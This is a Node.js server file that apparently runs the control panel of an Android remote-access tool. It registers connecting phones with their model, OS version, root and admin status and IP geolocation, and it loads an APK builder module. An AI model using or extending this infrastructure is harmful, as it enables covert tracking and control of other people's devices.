const express = require('express'),
	app = express(),
	
	server = require('http').createServer(app),
	IO = require('socket.io')(server),
	path = require('path'),
	geoip = require('geoip-lite'),
	CONST = require(path.join(__dirname, '/includes/const')),
	db = require(path.join(__dirname, '/includes/databaseGateway')),
	logManager = require(path.join(__dirname, '/includes/logManager')),
	clientManager = new (require(path.join(__dirname, '/includes/clientManager')))(db),
	apkBuilder = require(path.join(__dirname, '/includes/apkBuilder'));
port = process.env.PORT || CONST.web_port;

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// spin up socket server
// let client_io = IO.listen(CONST.control_port);

// client_io.sockets.pingInterval = 30000;
IO.sockets.pingInterval = 30000;
IO.on('connection', (socket) => {
	socket.emit('welcome');
	let clientParams = socket.handshake.query;
	let clientAddress = socket.request.connection;

	let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
	let clientGeo = geoip.lookup(clientIP);
	if (!clientGeo) clientGeo = {};

	clientManager.clientConnect(socket, clientParams.id, {
		clientIP,
		clientGeo,
		device: {
			model: clientParams.model,
			manufacture: clientParams.manf,
			version: clientParams.release,
			root: clientParams.root,
			admin: clientParams.admin
		},
	});

	if (CONST.debug) {
		var onevent = socket.onevent;
		socket.onevent = function (packet) {
			var args = packet.data || [];
			onevent.call(this, packet); // original call
			packet.data = ['*'].concat(args);
			onevent.call(this, packet); // additional call to catch-all
		};

		socket.on('*', function (event, data) {
			console.log(event);
			console.log(data);
		});
	}
});

// get the admin interface online
// app.listen(CONST.web_port);
server.listen(port, () => console.log(`listening on port ${port}`));



app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '/assets/views'));
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require(path.join(__dirname, '/includes/expressRoutes')));

app.enable('verbose errors');

app.get('/404', function(req, res, next){
  next();
});




app.use(function(req, res, next){
  res.status(404);

  res.format({
    html: function () {
		res.render('404', { url: "404" })
    },
    json: function () {
      res.json({ error: 'Not found' })
    },
    default: function () {
      res.type('txt').send('Not found')
    }
  })
});


